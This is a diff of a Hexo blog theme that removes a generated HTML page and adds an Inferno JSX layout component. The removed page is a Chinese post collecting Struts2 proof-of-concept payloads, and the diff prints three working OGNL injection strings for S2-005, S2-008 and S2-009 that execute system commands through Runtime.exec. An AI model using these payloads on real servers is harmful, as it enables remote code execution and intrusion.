@@ -1,244 +1,64 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
+const { Component } = require('inferno');
+const Head = require('./common/head');
+const Navbar = require('./common/navbar');
+const Widgets = require('./common/widgets');
+const Footer = require('./common/footer');
+const Scripts = require('./common/scripts');
+const Search = require('./common/search');
+const classname = require('./util/classname');
 
-  
-  <title>Struts2 POC集合 | 菜的Blog</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="本文收集了Struts2的大部分漏洞POC。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Struts2 POC集合">
-<meta property="og:url" content="http://yoursite.com/2020/03/01/Struts2POC%E9%9B%86%E5%90%88/index.html">
-<meta property="og:site_name" content="菜的Blog">
-<meta property="og:description" content="本文收集了Struts2的大部分漏洞POC。">
-<meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-03-01T05:18:22.000Z">
-<meta property="article:modified_time" content="2020-03-05T06:44:20.101Z">
-<meta property="article:author" content="John Doe">
-<meta property="article:tag" content="Struts2 POC">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="菜的Blog" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+module.exports = class extends Component {
+    render() {
+        const { env, site, config, page, helper, body } = this.props;
 
-<meta name="generator" content="Hexo 4.2.0"></head>
+        const{ comment } = config;
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">菜的Blog</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main"><article id="post-Struts2POC集合" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/03/01/Struts2POC%E9%9B%86%E5%90%88/" class="article-date">
-  <time datetime="2020-03-01T05:18:22.000Z" itemprop="datePublished">2020-03-01</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/POC/">POC</a>
-  </div>
+        // =====index hot_recommend
+        var hotRecommendStr =
+            "<div class=\"card widget\">" +
+            "   <div class=\"card-content\">" +
+            "       <h3 class=\"menu-label\">热门推荐</h3><span id=\"index_hot_div\">加载中，稍等几秒...</span>" +
+            "   </div>" +
+            "</div>";
 
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      Struts2 POC集合
-    </h1>
-  
+        if (page.path != 'index.html'
+            || (comment.type == 'undefined'
+                || comment.type != 'gitalk'
+                || comment.has_hot_recommend == 'undefined'
+                || !comment.has_hot_recommend)) {
+            hotRecommendStr = '';
+        }
+        // =====
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Struts-S2-005"><a href="#Struts-S2-005" class="headerlink" title="Struts-S2-005"></a>Struts-S2-005</h1><h2 id="poc-one"><a href="#poc-one" class="headerlink" title="poc one"></a>poc one</h2><p>此poc无回显，可能与apache版本有关！</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#39;)(kxlzx)(kxlzx)&amp;(&#39;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#39;)(bla)(bla)&amp;(&#39;\u0023mycmd\u003d\&#39;whoami\&#39;&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#39;)(bla)(bla)&amp;(A)((&#39;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#39;)(bla))&amp;(B)((&#39;\u0023myres\u003dnew\40byte[51020]&#39;)(bla))&amp;(C)((&#39;\u0023mydat.readFully(\u0023myres)&#39;)(bla))&amp;(D)((&#39;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#39;)(bla))&amp;(&#39;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#39;)(bla)(bla)&amp;(E)((&#39;\u0023myout.getWriter().println(\u0023mystr)&#39;)(bla))</span><br></pre></td></tr></table></figure>
+        const language = page.lang || page.language || config.language;
+        const columnCount = Widgets.getColumnCount(config.widgets);
 
-<h1 id="Struts-S2-008"><a href="#Struts-S2-008" class="headerlink" title="Struts-S2-008"></a>Struts-S2-008</h1><p>此POC可以直接回显，但是此POC的res存在上限，当大于700是显示的是null</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?debug&#x3D;command&amp;expression&#x3D;(%23_memberAccess.allowStaticMethodAccess&#x3D;true,%23context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;false,%23cmd&#x3D;&quot;ipconfig&quot;,%23ret&#x3D;@java.lang.Runtime@getRuntime().exec(%23cmd),%23data&#x3D;new+java.io.DataInputStream(%23ret.getInputStream()),%23res&#x3D;new+byte[500],%23data.readFully(%23res),%23echo&#x3D;new+java.lang.String(%23res),%23out&#x3D;@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))</span><br></pre></td></tr></table></figure>
-
-<h1 id="Struts-S2-009"><a href="#Struts-S2-009" class="headerlink" title="Struts-S2-009"></a>Struts-S2-009</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class.classLoader.jarPath&#x3D;%28%23context[\&quot;xwork.MethodAccessor.denyMethodExecution\&quot;]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[\&quot;allowStaticMethodAccess\&quot;]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&amp;z[%28class.classLoader.jarPath%29%28%27meh%27%29]</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/01/Struts2POC%E9%9B%86%E5%90%88/" data-id="ck89t2hbu0001qots645w2f5z" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Struts2-POC/" rel="tag">Struts2 POC</a></li></ul>
-
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2020/03/24/hello-world/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          Hello World
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2020/02/22/Markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Markdown基本语法</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/POC/">POC</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Markdown/" rel="tag">Markdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Struts2-POC/" rel="tag">Struts2 POC</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/Markdown/" style="font-size: 10px;">Markdown</a> <a href="/tags/Struts2-POC/" style="font-size: 10px;">Struts2 POC</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2020/03/24/hello-world/">Hello World</a>
-          </li>
-        
-          <li>
-            <a href="/2020/03/01/Struts2POC%E9%9B%86%E5%90%88/">Struts2 POC集合</a>
-          </li>
-        
-          <li>
-            <a href="/2020/02/22/Markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/">Markdown基本语法</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2020 John Doe<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-
-  
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-
-  
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-  </div>
-</body>
-</html>
+        return <html lang={language ? language.substr(0, 2) : ''}>
+            <Head env={env} site={site} config={config} helper={helper} page={page} />
+            <body class={`is-${columnCount}-column has-navbar-fixed-top`}>
+                <Navbar config={config} helper={helper} page={page} />
+                <script type="text/javascript" src="/js/theme-setting.js"></script>
+                <section class="section">
+                    <div class="container">
+                        <div class="columns">
+                            <div class={classname({
+                                column: true,
+                                'order-2': true,
+                                'column-main': true,
+                                'is-12': columnCount === 1,
+                                'is-8-tablet is-8-desktop is-8-widescreen': columnCount === 2,
+                                'is-8-tablet is-8-desktop is-6-widescreen': (page.layout != 'post' && page.layout != 'page') && columnCount === 3,
+                                'is-8-tablet is-8-desktop is-9-widescreen': page.layout == 'page' || page.layout == 'post'
+                            })} dangerouslySetInnerHTML={{ __html: hotRecommendStr+body }}></div>
+                            <Widgets site={site} config={config} helper={helper} page={page} position={'left'} />
+                            { page.layout == 'page' || page.layout == 'post' ? null : <Widgets site={site} config={config} helper={helper} page={page} position={'right'} />}
+                        </div>
+                    </div>
+                </section>
+                <Footer config={config} helper={helper} />
+                <Scripts site={site} config={config} helper={helper} page={page} />
+                <Search config={config} helper={helper} />
+            </body>
+        </html>;
+    }
+};
